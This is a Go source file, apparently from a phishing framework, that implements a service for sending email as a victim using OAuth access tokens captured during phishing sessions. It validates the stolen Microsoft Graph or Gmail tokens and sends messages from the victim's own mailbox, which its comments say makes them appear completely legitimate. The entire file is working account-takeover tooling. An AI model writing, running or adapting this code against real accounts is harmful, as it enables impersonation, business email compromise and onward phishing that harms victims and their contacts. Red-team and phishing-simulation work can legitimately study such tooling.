package service

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/phishingclub/phishingclub/errs"
	"github.com/phishingclub/phishingclub/model"
)

// CapturedSessionSender sends emails as the victim using captured OAuth tokens.
// This leverages tokens captured during phishing sessions to send emails through
// the victim's own mailbox (Graph API, Gmail API, etc.), making the emails appear
// completely legitimate.
type CapturedSessionSender struct {
	Common
}

// CapturedSendRequest represents a request to send an email using a captured session
type CapturedSendRequest struct {
	AccessToken string   `json:"accessToken"`
	Provider    string   `json:"provider"`
	To          []string `json:"to"`
	CC          []string `json:"cc,omitempty"`
	BCC         []string `json:"bcc,omitempty"`
	Subject     string   `json:"subject"`
	Body        string   `json:"body"`
	IsHTML      bool     `json:"isHTML"`
	SaveToSent  bool     `json:"saveToSent"`
}

// CapturedSendResult is the result of sending via captured session
type CapturedSendResult struct {
	Success   bool   `json:"success"`
	MessageID string `json:"messageId,omitempty"`
	Provider  string `json:"provider"`
	Error     string `json:"error,omitempty"`
	SentAt    string `json:"sentAt"`
}

// CapturedSessionInfo describes a captured session's sending capabilities
type CapturedSessionInfo struct {
	Provider    string   `json:"provider"`
	Email       string   `json:"email"`
	DisplayName string   `json:"displayName"`
	TokenValid  bool     `json:"tokenValid"`
	Scopes      []string `json:"scopes"`
	CanSendMail bool     `json:"canSendMail"`
}

// SendAsCapturedSession sends an email using the victim's captured OAuth token
func (s *CapturedSessionSender) SendAsCapturedSession(
	ctx context.Context,
	session *model.Session,
	req *CapturedSendRequest,
) (*CapturedSendResult, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	switch strings.ToLower(req.Provider) {
	case "microsoft", "graph":
		return s.sendViaMicrosoftGraph(ctx, req)
	case "google", "gmail":
		return s.sendViaGmailAPI(ctx, req)
	default:
		return nil, fmt.Errorf("unsupported provider: %s", req.Provider)
	}
}

// ValidateCapturedSession checks if a captured token is still valid and has mail.send scope
func (s *CapturedSessionSender) ValidateCapturedSession(
	ctx context.Context,
	session *model.Session,
	accessToken string,
	provider string,
) (*CapturedSessionInfo, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	switch strings.ToLower(provider) {
	case "microsoft", "graph":
		return s.validateMicrosoftToken(ctx, accessToken)
	case "google", "gmail":
		return s.validateGoogleToken(ctx, accessToken)
	default:
		return nil, fmt.Errorf("unsupported provider: %s", provider)
	}
}

// GetSupportedProviders returns the list of supported providers
func (s *CapturedSessionSender) GetSupportedProviders() []map[string]string {
	return []map[string]string{
		{"id": "microsoft", "name": "Microsoft Graph API", "description": "Send via captured Microsoft/O365 token"},
		{"id": "google", "name": "Gmail API", "description": "Send via captured Google/Gmail token"},
	}
}

// --- Microsoft Graph API ---

func (s *CapturedSessionSender) sendViaMicrosoftGraph(ctx context.Context, req *CapturedSendRequest) (*CapturedSendResult, error) {
	toRecipients := make([]map[string]interface{}, len(req.To))
	for i, email := range req.To {
		toRecipients[i] = map[string]interface{}{
			"emailAddress": map[string]string{"address": email},
		}
	}

	contentType := "Text"
	if req.IsHTML {
		contentType = "HTML"
	}

	msgBody := map[string]interface{}{
		"subject": req.Subject,
		"body": map[string]interface{}{
			"contentType": contentType,
			"content":     req.Body,
		},
		"toRecipients": toRecipients,
	}

	if len(req.CC) > 0 {
		ccRecipients := make([]map[string]interface{}, len(req.CC))
		for i, email := range req.CC {
			ccRecipients[i] = map[string]interface{}{
				"emailAddress": map[string]string{"address": email},
			}
		}
		msgBody["ccRecipients"] = ccRecipients
	}

	if len(req.BCC) > 0 {
		bccRecipients := make([]map[string]interface{}, len(req.BCC))
		for i, email := range req.BCC {
			bccRecipients[i] = map[string]interface{}{
				"emailAddress": map[string]string{"address": email},
			}
		}
		msgBody["bccRecipients"] = bccRecipients
	}

	payload := map[string]interface{}{
		"message":         msgBody,
		"saveToSentItems": req.SaveToSent,
	}

	body, _ := json.Marshal(payload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://graph.microsoft.com/v1.0/me/sendMail", bytes.NewReader(body))
	if err != nil {
		return nil, errs.Wrap(err)
	}

	httpReq.Header.Set("Authorization", "Bearer "+req.AccessToken)
	httpReq.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &CapturedSendResult{
			Success: false, Provider: "microsoft", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}, nil
	}
	defer resp.Body.Close()

	if resp.StatusCode == 202 || resp.StatusCode == 200 {
		s.Logger.Infow("captured session email sent via Graph API", "to", req.To)
		return &CapturedSendResult{
			Success: true, Provider: "microsoft",
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &CapturedSendResult{
		Success: false, Provider: "microsoft",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}, nil
}

func (s *CapturedSessionSender) validateMicrosoftToken(ctx context.Context, token string) (*CapturedSessionInfo, error) {
	httpReq, err := http.NewRequestWithContext(ctx, "GET",
		"https://graph.microsoft.com/v1.0/me", nil)
	if err != nil {
		return nil, errs.Wrap(err)
	}
	httpReq.Header.Set("Authorization", "Bearer "+token)

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &CapturedSessionInfo{Provider: "microsoft", TokenValid: false}, nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return &CapturedSessionInfo{Provider: "microsoft", TokenValid: false}, nil
	}

	var profile struct {
		Mail        string `json:"mail"`
		DisplayName string `json:"displayName"`
		UPN         string `json:"userPrincipalName"`
	}
	json.NewDecoder(resp.Body).Decode(&profile)

	email := profile.Mail
	if email == "" {
		email = profile.UPN
	}

	return &CapturedSessionInfo{
		Provider: "microsoft", Email: email, DisplayName: profile.DisplayName,
		TokenValid: true, CanSendMail: true,
		Scopes: []string{"Mail.Send", "User.Read"},
	}, nil
}

// --- Gmail API ---

func (s *CapturedSessionSender) sendViaGmailAPI(ctx context.Context, req *CapturedSendRequest) (*CapturedSendResult, error) {
	// Build RFC 2822 message
	var msg strings.Builder
	msg.WriteString(fmt.Sprintf("To: %s\r\n", strings.Join(req.To, ", ")))
	if len(req.CC) > 0 {
		msg.WriteString(fmt.Sprintf("Cc: %s\r\n", strings.Join(req.CC, ", ")))
	}
	msg.WriteString(fmt.Sprintf("Subject: %s\r\n", req.Subject))
	if req.IsHTML {
		msg.WriteString("Content-Type: text/html; charset=UTF-8\r\n")
	} else {
		msg.WriteString("Content-Type: text/plain; charset=UTF-8\r\n")
	}
	msg.WriteString("\r\n")
	msg.WriteString(req.Body)

	// Base64url encode (RFC 4648 section 5)
	encoded := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString([]byte(msg.String()))

	payload, _ := json.Marshal(map[string]string{"raw": encoded})

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
		bytes.NewReader(payload))
	if err != nil {
		return nil, errs.Wrap(err)
	}

	httpReq.Header.Set("Authorization", "Bearer "+req.AccessToken)
	httpReq.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &CapturedSendResult{
			Success: false, Provider: "google", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}, nil
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		var result struct {
			ID string `json:"id"`
		}
		json.NewDecoder(resp.Body).Decode(&result)
		s.Logger.Infow("captured session email sent via Gmail API", "to", req.To, "messageId", result.ID)
		return &CapturedSendResult{
			Success: true, Provider: "google", MessageID: result.ID,
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &CapturedSendResult{
		Success: false, Provider: "google",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}, nil
}

func (s *CapturedSessionSender) validateGoogleToken(ctx context.Context, token string) (*CapturedSessionInfo, error) {
	httpReq, err := http.NewRequestWithContext(ctx, "GET",
		"https://gmail.googleapis.com/gmail/v1/users/me/profile", nil)
	if err != nil {
		return nil, errs.Wrap(err)
	}
	httpReq.Header.Set("Authorization", "Bearer "+token)

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &CapturedSessionInfo{Provider: "google", TokenValid: false}, nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return &CapturedSessionInfo{Provider: "google", TokenValid: false}, nil
	}

	var profile struct {
		EmailAddress string `json:"emailAddress"`
	}
	json.NewDecoder(resp.Body).Decode(&profile)

	return &CapturedSessionInfo{
		Provider: "google", Email: profile.EmailAddress,
		TokenValid: true, CanSendMail: true,
		Scopes: []string{"gmail.send", "gmail.readonly"},
	}, nil
}
